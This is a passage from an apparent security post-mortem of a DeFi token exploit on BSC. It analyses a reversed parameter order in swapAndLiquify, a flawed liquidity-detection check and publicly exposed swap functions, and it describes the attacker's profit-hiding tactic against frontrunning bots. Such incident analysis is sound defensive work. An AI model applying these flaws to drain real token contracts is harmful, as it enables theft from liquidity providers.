</span><span id="__span-11-19"><a id="__codelineno-11-19" name="__codelineno-11-19" href="#__codelineno-11-19"></a><span class="w">        </span><span class="m m-Decimal">0</span><span class="p">,</span>
</span><span id="__span-11-20"><a id="__codelineno-11-20" name="__codelineno-11-20" href="#__codelineno-11-20"></a><span class="w">        </span>_tokenOwner<span class="p">,</span>
</span><span id="__span-11-21"><a id="__codelineno-11-21" name="__codelineno-11-21" href="#__codelineno-11-21"></a><span class="w">        </span><span class="k">block.timestamp</span>
</span><span id="__span-11-22"><a id="__codelineno-11-22" name="__codelineno-11-22" href="#__codelineno-11-22"></a><span class="w">    </span><span class="p">);</span>
</span><span id="__span-11-23"><a id="__codelineno-11-23" name="__codelineno-11-23" href="#__codelineno-11-23"></a><span class="p">}</span>
</span></code></pre></div>
<p>When adding liquidity with <code>mbc</code> first and <code>usdt</code> second, it triggers the <code>swapAndLiquify</code> function. As previously discussed, this function involves selling the contract's tokens for USDT and then adding liquidity. The issue arises because the parameter order is incorrect: <code>addLiquidityUsdt</code> expects the contract's token quantity first and then the USDT quantity. However, when calling <code>swapAndLiquify</code>, the parameters are passed in reverse order, leading to the error in the test code.</p>
<p>As for why adding liquidity with <code>usdt</code> first and <code>mbc</code> second doesn't result in an error, it's due to a flaw in the <code>_isAddLiquidityV1</code> function's logic:</p>
<div class="language-solidity highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">_isAddLiquidityV1</span><span class="p">()</span><span class="w"> </span><span class="kt">internal</span><span class="w"> </span>view<span class="w"> </span><span class="kt">returns</span><span class="p">(</span><span class="kt">bool</span><span class="w"> </span><span class="nv">ldxAdd</span><span class="p">){</span>
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">token0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>IUniswapV2Pair<span class="p">(</span><span class="kt">address</span><span class="p">(</span>uniswapV2Pair<span class="p">)).</span>token0<span class="p">();</span>
</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">token1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>IUniswapV2Pair<span class="p">(</span><span class="kt">address</span><span class="p">(</span>uniswapV2Pair<span class="p">)).</span>token1<span class="p">();</span>
</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="w">    </span><span class="p">(</span><span class="kt">uint</span><span class="w"> </span><span class="nv">r0</span><span class="p">,</span><span class="kt">uint</span><span class="w"> </span><span class="nv">r1</span><span class="p">,)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>IUniswapV2Pair<span class="p">(</span><span class="kt">address</span><span class="p">(</span>uniswapV2Pair<span class="p">)).</span>getReserves<span class="p">();</span>
</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="nv">bal1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>IERC20<span class="p">(</span>token1<span class="p">).</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span>uniswapV2Pair<span class="p">));</span>
</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="nv">bal0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>IERC20<span class="p">(</span>token0<span class="p">).</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span>uniswapV2Pair<span class="p">));</span>
</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="w">    </span><span class="kt">if</span><span class="p">(</span><span class="w"> </span>token0<span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)</span><span class="w"> </span><span class="p">){</span>
</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="w">        </span><span class="kt">if</span><span class="p">(</span><span class="w"> </span>bal1<span class="w"> </span><span class="o">&gt;</span><span class="w"> </span>r1<span class="p">){</span>
</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="w">            </span><span class="kt">uint</span><span class="w"> </span><span class="nv">change1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>bal1<span class="w"> </span><span class="o">-</span><span class="w"> </span>r1<span class="p">;</span>
</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="w">            </span>ldxAdd<span class="w"> </span><span class="o">=</span><span class="w"> </span>change1<span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="m m-Decimal">1000</span><span class="p">;</span>
</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a><span class="w">    </span><span class="p">}</span><span class="kt">else</span><span class="p">{</span>
</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a><span class="w">        </span><span class="kt">if</span><span class="p">(</span><span class="w"> </span>bal0<span class="w"> </span><span class="o">&gt;</span><span class="w"> </span>r0<span class="p">){</span>
</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a><span class="w">            </span><span class="kt">uint</span><span class="w"> </span><span class="nv">change0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>bal0<span class="w"> </span><span class="o">-</span><span class="w"> </span>r0<span class="p">;</span>
</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a><span class="w">            </span>ldxAdd<span class="w"> </span><span class="o">=</span><span class="w"> </span>change0<span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="m m-Decimal">1000</span><span class="p">;</span>
</span><span id="__span-12-16"><a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-12-17"><a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-12-18"><a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a><span class="p">}</span>
</span></code></pre></div>
<p>As mentioned earlier, this function checks whether the current <code>_transfer</code> operation is part of adding liquidity. If it isn't, the contract's tokens are exchanged and liquidity is added. The problem arises because when adding liquidity with <code>usdt</code> first and <code>mbc</code> second, it is detected by the <code>_isAddLiquidityV1</code> function, so the <code>swapAndLiquify</code> function isn't executed. However, when adding liquidity with <code>mbc</code> first and <code>usdt</code> second, the router first transfers the <code>mbc</code> tokens, and at this point, <code>usdt</code> hasn't been added to the pool yet. As a result, the <code>_isAddLiquidityV1</code> function doesn't detect a change in the pool's <code>usdt</code> balance, leading to the assumption that liquidity isn't being added. This causes the <code>swapAndLiquify</code> function to execute. This behavior can result in inconsistencies between user expectations and actual outcomes when ordinary users add liquidity, as seen in the test code.</p>
<p>Additionally, it's worth noting that making both the <code>swapAndLiquify</code> and <code>swapTokensForOther</code> functions <code>public</code> is also a vulnerability.</p>
<h3 id="frontrunning-protection">Frontrunning Protection</h3>
<p>Upon decompilation of the <a href="https://bscscan.com/address/0xe4a5e6a59bb390a1abc39eb6c6dd61d8f3e9bd58">attack contract</a>, it appears that the code mainly relies on relatively simple require validation statements.</p>
<p>However, as analyzed earlier, the attacker did not directly retain profits in the attackContract or send them to their address in the attack transactions. Instead, they transferred the profits to a pre-existing contract, which served as temporary storage for attack income, and later withdraw it all at once. This tactic was used to prevent their gains from becoming too conspicuous and potentially attracting the attention of bots. However, the effectiveness of this approach may be limited.</p>
<h2 id="reference">Reference</h2>
<p><a href="https://betterprogramming.pub/uniswap-v2-in-depth-98075c826254">A Deep Dive Into the Uniswap V2 Protocol</a></p>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
    
      
      <nav class="md-footer__inner md-grid" aria-label="Footer" >
        
          
          <a href="../221025_ULME/" class="md-footer__link md-footer__link--prev" aria-label="Previous: 221025-ULME">
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
            </div>
            <div class="md-footer__title">
              <span class="md-footer__direction">
                Previous
              </span>
              <div class="md-ellipsis">
                221025-ULME
              </div>
            </div>
          </a>
        
        
          
          <a href="../../2023/230119_SHOCO/" class="md-footer__link md-footer__link--next" aria-label="Next: 230119-SHICO">
            <div class="md-footer__title">
              <span class="md-footer__direction">
                Next
              </span>
              <div class="md-ellipsis">
                230119-SHICO
              </div>
            </div>
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
            </div>
          </a>
        
      </nav>
    
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.footer", "content.code.copy", "search.suggest", "search.highlight", "search.share"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.83f73b43.min.js"></script>
      
        <script src="../../javascripts/katex.js"></script>
      
        <script src="https://unpkg.com/katex@0/dist/katex.min.js"></script>
      
        <script src="https://unpkg.com/katex@0/dist/contrib/auto-render.min.js"></script>
      
    
  </body>
</html>